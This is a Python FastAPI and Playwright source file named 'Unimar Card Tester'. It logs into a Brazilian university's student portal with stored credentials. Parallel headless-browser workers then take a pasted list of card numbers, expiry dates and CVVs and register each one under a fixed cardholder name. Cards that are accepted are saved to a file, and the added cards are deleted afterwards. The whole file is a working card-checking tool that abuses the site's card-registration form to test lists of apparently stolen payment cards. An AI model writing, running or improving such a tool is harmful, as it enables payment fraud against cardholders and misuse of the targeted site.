import asyncio
import os
import random
import logging
from contextlib import asynccontextmanager
from pathlib import Path
from typing import List

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from playwright.async_api import async_playwright, Browser

# ===================== CONFIG & LOGGING =====================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

URL_LOGIN = "https://digital.unimar.br/login"
URL_MEUS_CARTOES = "https://digital.unimar.br/areadoaluno/conta/meuscartoes"

EMAIL = os.getenv("UNIMAR_EMAIL")
SENHA = os.getenv("UNIMAR_SENHA")
NOME_FIXO = "Bruna Mendes"

if not EMAIL or not SENHA:
    raise ValueError("Credenciais UNIMAR_EMAIL e UNIMAR_SENHA devem ser definidas.")

# ===================== ESTADO THREAD-SAFE =====================
class AppState:
    def __init__(self):
        self.rodando = False
        self.clients: set[WebSocket] = set()
        self.total_cartoes = 0
        self.processados = 0
        self.aprovados = 0
        self.tarefas_concluidas = 0
        self.lock = asyncio.Lock()

    async def increment_aprovados(self):
        async with self.lock:
            self.aprovados += 1

    async def increment_processados(self):
        async with self.lock:
            self.processados += 1
            self.tarefas_concluidas += 1

    async def reset(self):
        async with self.lock:
            self.total_cartoes = 0
            self.processados = 0
            self.aprovados = 0
            self.tarefas_concluidas = 0

estado = AppState()

# Fila de broadcast para garantir entrega
broadcast_queue = asyncio.Queue()

async def process_broadcast_queue():
    """Processa a fila de mensagens enviadas para os clientes."""
    while True:
        message = await broadcast_queue.get()
        disconnected = []
        for client in list(estado.clients):
            try:
                await client.send_json(message)
            except Exception:
                disconnected.append(client)
        
        for client in disconnected:
            estado.clients.discard(client)
        broadcast_queue.task_done()

async def log(mensagem: str):
    logger.info(mensagem)
    # Envia para a fila de broadcast em vez de criar task direta
    await broadcast_queue.put({"type": "log", "mensagem": mensagem})

async def broadcast(type: str, data: dict = None):
    if data is None:
        data = {}
    message = {"type": type, **data}
    await broadcast_queue.put(message)

# ===================== LIFESPAN =====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    Path("aprovados.txt").touch(exist_ok=True)
    # Inicia o worker de broadcast
    asyncio.create_task(process_broadcast_queue())
    yield

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ===================== WEBSOCKET =====================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    estado.clients.add(websocket)
    try:
        while True:
            await asyncio.sleep(10)
    except WebSocketDisconnect:
        estado.clients.discard(websocket)

# ===================== FUNÇÕES AUXILIARES =====================
async def limpar_cartoes_antigos(page):
    try:
        logger.info("[Faxina] Iniciando limpeza...")
        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle", timeout=30000)
        await asyncio.sleep(2)

        while True:
            botoes = page.get_by_role("button", name="Remover")
            count = await botoes.count()
            if count == 0:
                break
            
            await botoes.first.click(force=True)
            await asyncio.sleep(1)
            
            try:
                confirm = page.get_by_role("button", name="Sim").or_(page.get_by_role("button", name="Confirmar"))
                if await confirm.is_visible():
                    await confirm.click(force=True)
                    await page.wait_for_load_state("networkidle")
                    await asyncio.sleep(1.5)
            except Exception:
                pass

        logger.info("[Faxina] Limpeza concluída.")
    except Exception as e:
        logger.error(f"[Faxina] Erro: {e}")

async def criar_sessao_mestre(playwright):
    try:
        logger.info("[Auth] Login mestre...")
        browser = await playwright.chromium.launch(headless=True, args=["--no-sandbox"])
        context = await browser.new_context()
        page = await context.new_page()

        await page.goto(URL_LOGIN, wait_until="networkidle", timeout=60000)
        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(SENHA)
        await page.get_by_role("button", name="Entrar").click()

        await page.wait_for_selector("text=Meus Cartões", timeout=30000)
        await limpar_cartoes_antigos(page)
        await context.storage_state(path="sessao_unimar.json")
        
        await context.close()
        await browser.close()
        logger.info("[Auth] Sessão salva.")
        return True
    except Exception as e:
        logger.error(f"[Auth] Falha: {e}")
        return False

async def processar_item(page, item: tuple, estado_fluxo: dict):
    indice, linha, tentativas = item
    
    try:
        numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
        logger.info(f"[Item {indice}] Processando ...{numero[-4:]}")
        await log(f"[Canal Ativo] Testando cartão final {numero[-4:]}")

        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
        await asyncio.sleep(random.uniform(0.5, 1.5))

        await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
        await asyncio.sleep(0.5)

        await page.get_by_role("textbox", name="Número do cartão").fill(numero)
        await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
        await page.get_by_label("Mês").select_option(mes)
        await page.get_by_label("Ano").select_option(ano)
        await page.get_by_role("textbox", name="CVV").fill(cvv)

        botoes_antes = await page.get_by_role("button", name="Remover").count()
        
        await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
        
        aprovado = False
        for _ in range(20):
            if not estado.rodando:
                break
                
            botoes_atuais = await page.get_by_role("button", name="Remover").count()
            if botoes_atuais > botoes_antes:
                aprovado = True
                break
            
            body_text = await page.locator("body").inner_text()
            if any(x in body_text.lower() for x in ["inválida", "recusado", "erro", "declined"]):
                break
                
            await asyncio.sleep(1.5)

        if aprovado:
            logger.info(f"[Item {indice}] ✅ APROVADO")
            await broadcast("aprovado", {"cartao": linha})
            await estado.increment_aprovados()
            estado_fluxo["houve_aprovados"] = True
            
            with open("aprovados.txt", "a") as f:
                f.write(f"{linha}\n")
        else:
            logger.info(f"[Item {indice}] ❌ Reprovado/Erro")
            await broadcast("reprovado", {"cartao": linha})

    except Exception as e:
        logger.error(f"[Item {indice}] Erro crítico: {e}")
        await log(f"[Erro] Falha no item {indice}: {str(e)[:50]}")

async def worker(id_worker: int, browser: Browser, fila: asyncio.Queue, estado_fluxo: dict):
    context = None
    page = None
    try:
        logger.info(f"[Worker {id_worker}] Iniciado.")
        await log(f"[Sistema] Worker {id_worker} iniciado.")
        
        context = await browser.new_context(storage_state="sessao_unimar.json")
        page = await context.new_page()
        
        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")

        while estado.rodando:
            try:
                if fila.empty():
                    await asyncio.sleep(0.5)
                    if fila.empty():
                        break
                    continue

                item = await asyncio.wait_for(fila.get(), timeout=5.0)
                await processar_item(page, item, estado_fluxo)
                await estado.increment_processados()
                
                await broadcast("progresso", {
                    "processados": estado.processados,
                    "total": estado.total_cartoes,
                    "aprovados": estado.aprovados
                })
                fila.task_done()
                
            except asyncio.TimeoutError:
                if fila.empty():
                    break
            except Exception as e:
                logger.error(f"[Worker {id_worker}] Erro no loop: {e}")
                break

    except Exception as e:
        logger.error(f"[Worker {id_worker}] Falha fatal: {e}")
    finally:
        if page:
            await page.close()
        if context:
            await context.close()
        logger.info(f"[Worker {id_worker}] Finalizado.")
        await log(f"[Sistema] Worker {id_worker} finalizado.")

async def processar_cartoes(texto_cartoes: str, num_canais: int):
    try:
        linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
        linhas = list(dict.fromkeys(linhas))

        await estado.reset()
        estado.total_cartoes = len(linhas)
        
        if estado.total_cartoes == 0:
            logger.error("[Sistema] Lista vazia.")
            return

        num_canais = min(num_canais, estado.total_cartoes)
        if num_canais < 1:
            num_canais = 1

        logger.info(f"[Sistema] Iniciando: {num_canais} workers, {estado.total_cartoes} cartões.")
        await log(f"[Sistema] Iniciando processo com {num_canais} canais.")

        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))

        async with async_playwright() as pw:
            if not await criar_sessao_mestre(pw):
                return

            estado_fluxo = {"houve_aprovados": False}
            browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])

            tasks = [asyncio.create_task(worker(i, browser, fila, estado_fluxo)) for i in range(1, num_canais + 1)]
            
            await asyncio.gather(*tasks, return_exceptions=True)

            if estado_fluxo["houve_aprovados"]:
                logger.info("[Sistema] Faxina final...")
                await log("[Sistema] Iniciando faxina final...")
                try:
                    clean_context = await browser.new_context(storage_state="sessao_unimar.json")
                    clean_page = await clean_context.new_page()
                    await limpar_cartoes_antigos(clean_page)
                    await clean_context.close()
                except Exception as e:
                    logger.error(f"[Faxina Final] Erro: {e}")

            await browser.close()

    except Exception as e:
        logger.error(f"[ERRO CRÍTICO] {e}")
        await log(f"[ERRO CRÍTICO] {e}")
    finally:
        estado.rodando = False
        logger.info("[Sistema] Processo finalizado.")
        await log("[Sistema] Processo finalizado.")

# ===================== ROTAS =====================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    if estado.rodando:
        return {"status": "já_em_execucao"}
    
    estado.rodando = True
    await broadcast("status", {"rodando": True})
    asyncio.create_task(processar_cartoes(data.lista, data.canais))
    return {"status": "iniciado"}

@app.post("/api/parar")
async def parar():
    if not estado.rodando:
        return {"status": "não_executando"}
        
    estado.rodando = False
    logger.info("⛔ Interrupção solicitada.")
    await log("⛔ Interrupção solicitada pelo usuário.")
    await broadcast("status", {"rodando": False})
    return {"status": "parando"}

@app.get("/", response_class=HTMLResponse)
async def index():
    try:
        with open("templates/index.html", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return "<html><body><h1>UI não encontrada.</h1></body></html>"

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=5000)
